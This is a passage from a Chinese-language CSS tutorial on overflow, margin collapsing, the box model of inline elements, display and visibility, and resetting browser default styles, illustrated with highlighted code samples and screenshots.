&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">overflow</span>: hidden; <span class="comment">/* 隐藏溢出内容 */</span></span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores aspernatur illo inventore</span><br><span class="line">    deleniti laudantium quaerat excepturi sed quidem tempore? Eaque, cumque porro. Fuga quam error cupiditate quasi</span><br><span class="line">    eveniet in numquam!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/980c7bbdbbe5b9ef.png" alt=""></p><p><code>scroll</code>  生成两个滚动条，通过滚动条来查看完整的内容</p><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">overflow</span>: scroll;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores aspernatur illo inventore</span><br><span class="line">    deleniti laudantium quaerat excepturi sed quidem tempore? Eaque, cumque porro. Fuga quam error cupiditate quasi</span><br><span class="line">    eveniet in numquam!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/bf7dec4a6ddb5366.png" alt=""></p><p><code>auto</code>  根据需要生成滚动条（根据需要自动添加滚动条，只有同时需要横向与纵向滚动条时才会同时添加）</p><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">overflow</span>: auto;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores aspernatur illo inventore</span><br><span class="line">    deleniti laudantium quaerat excepturi sed quidem tempore? Eaque, cumque porro. Fuga quam error cupiditate quasi</span><br><span class="line">    eveniet in numquam!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="边距折叠"><a class="markdownIt-Anchor" href="#边距折叠">#</a> 边距折叠</h3><p>垂直外边距的重叠（折叠）：相邻的垂直方向外边距会发生重叠现象</p><h4 id="兄弟元素"><a class="markdownIt-Anchor" href="#兄弟元素">#</a> 兄弟元素</h4><p>兄弟元素间的相邻，垂直外边距会取两者之间的较大值（两者都是正值）</p><p>特殊情况：</p><ul><li><p>如果相邻的外边距一正一负，则取两者的和</p></li><li><p>如果相邻的外边距都是负值，则取两者中绝对值较大的</p></li></ul><p><strong>示例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>,<span class="selector-class">.box2</span>&#123; </span><br><span class="line">    <span class="attribute">width</span>:<span class="number">200px</span>; </span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>; </span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxl</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="comment">/*设置一个下外边距*/</span></span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">    <span class="comment">/*设置一个上外边距*/</span></span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><p>兄弟元素之间的外边距的重叠，对于开发是有利的，所以我们不需要进行处理</p><h4 id="父子元素"><a class="markdownIt-Anchor" href="#父子元素">#</a> 父子元素</h4><p>父子元素间相邻外边距，子元素会传递给父元素（上外边距）<strong>（此时父子元素的边框重合）</strong></p><p><strong>示例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box3</span>&#123;</span><br><span class="line"><span class="attribute">width</span>：<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box4</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>; </span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: orange; </span><br><span class="line">    <span class="comment">/* margin-top: 100px; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/9abb0b46704ab901.png" alt=""></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/96f0560f1c855696.png" alt=""></p><p>父子外边距的折叠会影响到页面的布局，必须要进行处理</p><p><strong>处理方式 1</strong></p><p>1、我们转换思路，将对子元素的调整转为对父元素的调整</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">100px</span>; <span class="comment">/* 不调整子元素的margin，而是转而调整父元素的padding */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box4</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">    <span class="comment">/* margin-top: 100px; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><a href="https://imgtu.com/i/7BMgQU"><img data-src="https://s4.ax1x.com/2022/01/18/7BMgQU.png" alt="7BMgQU.png"></a></p><p>可以看到父元素位置虽然正确了，但是高度却被 “撑大了”。我们之前说过，padding 属性会影响元素的大小 [<a href="#fn3">3]</a></p><p>2、这里我们还需要计算并手动调整下父元素的高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>; <span class="comment">/* height: 200px; */</span></span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">100px</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box4</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><a href="https://imgtu.com/i/7BM4oR"><img data-src="https://s4.ax1x.com/2022/01/18/7BM4oR.png" alt="7BM4oR.png"></a></p><p><strong>处理方式 2</strong></p><p>1、我们仍然保留子元素的 <code>margin-top</code>  属性，但是给父元素加一个上边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> rebeccapurple solid; <span class="comment">/* 在父元素上加一个border-top（上边框） */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box4</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">100px</span>; <span class="comment">/* 不删除，保留 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://www.hualigs.cn/image/61e6d1494e5a3.jpg" alt=""></p><p>2、但是因为加了 1px 的边框，所以父元素盒子的高度也增加了 1px。那我们就需要手动调整父元素的高度，同时让边框颜色与父元素盒子颜色保持一致</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">199px</span>; <span class="comment">/* height: 200px; */</span></span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> <span class="number">#bfa</span> solid; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box4</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/7B2hBF"><img data-src="https://s4.ax1x.com/2022/01/18/7B2hBF.png" alt="7B2hBF.png"></a></p><p>但是我们没有发现一个问题不难发现一个问题，子元素也往下移动了 1px 的距离</p><p>因为父元素高度少了 1px，而子元素的 margin-top 是从边框下面开始算的</p><p>所以，凭借大家朴素的情感，哪个应该怎么判？ 应该怎么改？</p><p>改法也很简单，margin-top 减去一个像素即可</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">199px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> <span class="number">#bfa</span> solid; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box4</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">99px</span>; <span class="comment">/* margin-top: 100px; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://www.tupians.top/imgs/2022/01/dde9b27ded79fa9c.png" alt=""></p><p>同时，我们用刻度尺测量，父子元素底部是在一条水平线上的</p><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210521213806.png" alt="img"></p><h3 id="脱离文档流"><a class="markdownIt-Anchor" href="#脱离文档流">#</a> 脱离文档流</h3><p>上述示例 2 中，使用了 border 属性，就让子元素的外边距不去传递给父元素了，这是为什么呢？</p><p>margin (子元素远离父元素边框)</p><p>如果父盒子没有设置 border 框着，那么他的子元素无法利用 margin-top 来远离父元素的上边框</p><p>如果使用了 margin-top 会使子元素和父元素一起往下移</p><p>（子想离，父不设置 border 边框 则离得是流 不是父盒子）</p><p>应该是 border 让元素脱离了文档流（margin 塌陷）</p><p>好吧好吧，至于什么是 margin 塌陷，我也是问了度娘，有兴趣的可以自行百度，这里就不再赘述了</p><h2 id="7-行内元素的盒模型"><a class="markdownIt-Anchor" href="#7-行内元素的盒模型">#</a> 7. 行内元素的盒模型</h2><ul><li><p>行内元素不支持设置宽度和高度</p><p><img data-src="https://www.tupians.top/imgs/2022/01/7adaa80a28f24b54.png" alt=""></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="comment">/* 行内元素设置了宽高也没用，不会生效 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>行内元素可以设置 <code>padding</code> ，但是垂直方向 <code>padding</code>  不会影响页面的布局<br><img data-src="https://www.tupians.top/imgs/2022/01/fa06cadba10e8a92.png" alt=""></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="comment">/* 下方的div元素并没有因span设置了padding属性，而受到位置上的影响 */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>行内元素可以设置 <code>border</code> ，垂直方向的 <code>border</code>  不会影响页面的布局<br><img data-src="https://www.tupians.top/imgs/2022/01/5aa141f791a52350.png" alt=""></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> orange solid;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>行内元素可以设置 <code>margin</code> ，垂直方向的 <code>margin</code>  不会影响页面的布局<br><img data-src="https://www.tupians.top/imgs/2022/01/e94206bae2b368a2.png" alt=""></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我就是想要行内元素对页面布局产生影响呢？</p><p>~~ 那就拉出去枪毙了！~~ 那也是有办法的！</p><p><code>display</code>  用来设置元素显示的类型</p><ul><li><p><code>inline</code>  将元素设置为行内元素</p></li><li><p><code>block</code>  将元素设置为块元素<br><img data-src="https://www.tupians.top/imgs/2022/01/49a588cfeddb8eec.png" alt=""></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="comment">/* 将行内元素设置为块元素 */</span></span><br><span class="line">    <span class="attribute">display</span>: block; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>inline-block</code>  将元素设置为行内块元素行内块，既可以设置宽度和高度又不会独占一行<br><img data-src="https://www.tupians.top/imgs/2022/01/ba7eaca87f24ba8c.png" alt=""></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="comment">/* 将行内元素设置为行内块元素，兼顾行内元素和块元素的特点 */</span></span><br><span class="line">    <span class="attribute">display</span>: inline-block; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>table</code>  将元素设置为一个表格</p></li><li><p><code>none</code>  元素不在页面中显示<br><img data-src="https://www.tupians.top/imgs/2022/01/afbda03c131e696c.png" alt=""></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="comment">/* 将行内元素设置为none：不显示 */</span></span><br><span class="line">    <span class="attribute">display</span>: none; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不显示是不显示了，但是原来属于 s1 的位置也没了</p><p><code>visibility</code>  用来设置元素的显示状态</p><ul><li><p><code>visible</code>  默认值，元素在页面中正常显示</p></li><li><p><code>hidden</code>  元素在页面中隐藏不显示，但是依然占据页面的位置<br><img data-src="https://www.tupians.top/imgs/2022/01/2d6b4da97a318909.png" alt=""></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.s1</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">visibility</span>: hidden; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-浏览器的默认样式"><a class="markdownIt-Anchor" href="#8-浏览器的默认样式">#</a> 8. 浏览器的默认样式</h2><p>通常情况，浏览器都会为元素设置一些默认样式</p><p>默认样式的存在会影响到页面的布局，通常情况下编写网页时必须要去除浏览器的默认样式（PC 端的页面）</p><p>在当今网页设计 / 开发实践中，使用 CSS 来为语义化的 (X) HTML 标记添加样式风格是重要的关键。</p><p>在设计师们的梦想中都存在着这样的一个完美世界：所有的浏览器都能够理解和适用多有 CSS 规则，并且呈现相同的视觉效果 (没有兼容性问题)。</p><p>但是，我们并没有生活在这个完美的世界，现实中发生的失窃却总是恰恰相反，很多 CSS 样式在不同的浏览器中有着不同的解释和呈现。</p><p>当今流行的浏览器 (如：Firefox、Opera、Internet Explorer、Chrome、Safari 等等) 中，有一些都是以自己的方式去理解 CSS 规范，这就会导致有的浏览器对 CSS 的解释与设计师的 CSS 定义初衷相冲突，使得网页的样子在某些浏览器下能正确按照设计师的想法显示</p><p>而且有些浏览器却并没有按照设计师想要的样子显示出来，这就导致浏览器的兼容性问题。</p><p>更糟的是，有的浏览器完全无视 CSS 的一些声明和属性。</p><p>我们可以尝试编写 css 样式，以去除浏览器的默认样式</p><p><strong>示例</strong></p><p>html 代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">&lt;1i&gt;列表项1&lt;/1i&gt;</span><br><span class="line">&lt;1i&gt;列表项2&lt;/1i&gt;</span><br><span class="line">&lt;1i&gt;列表项3&lt;/1i&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css 代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>; </span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://www.tupians.top/imgs/2022/01/63f509b82576ccb1.png" alt=""></p><p><strong>F12 看盒子默认样式</strong></p><ol><li><p><img data-src="https://www.tupians.top/imgs/2022/01/0aeff94f0aa88a0d.png" alt=""></p></li><li><p>段落之间有 16px 的默认行距<br><img data-src="https://www.tupians.top/imgs/2022/01/f65ca7735ad1414e.png" alt=""></p></li><li><p>列表外有 16px 的上下外边距和 40px 的左内边距，而且每项列表前有一个小黑点<br><img data-src="https://www.tupians.top/imgs/2022/01/149e2ac03e58e484.png" alt=""></p></li></ol><p><strong>去除默认样式</strong></p><ol><li>去除与浏览器的边缘间距<br><img data-src="https://www.tupians.top/imgs/2022/01/cdb92147e727a93a.png" alt=""></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>去除段落之间行距<br><img data-src="https://www.tupians.top/imgs/2022/01/57847077739e76cc.png" alt=""></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>去除列表的上下外边距和左内边距<br><img data-src="https://www.tupians.top/imgs/2022/01/aa51b514e2362c4e.png" alt=""><br>我们只是去除了列表的内外边距，但是发现前面的黑点也消失了，真的如此吗？<br>我们先给 <code>ul</code>  加上一个 <code>margin-left</code> <br><img data-src="https://www.tupians.top/imgs/2022/01/9c4aab0ff2f10415.png" alt=""><br> 看来黑点并没有自动清除，而只是 “缩进” 了浏览器的左侧</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span 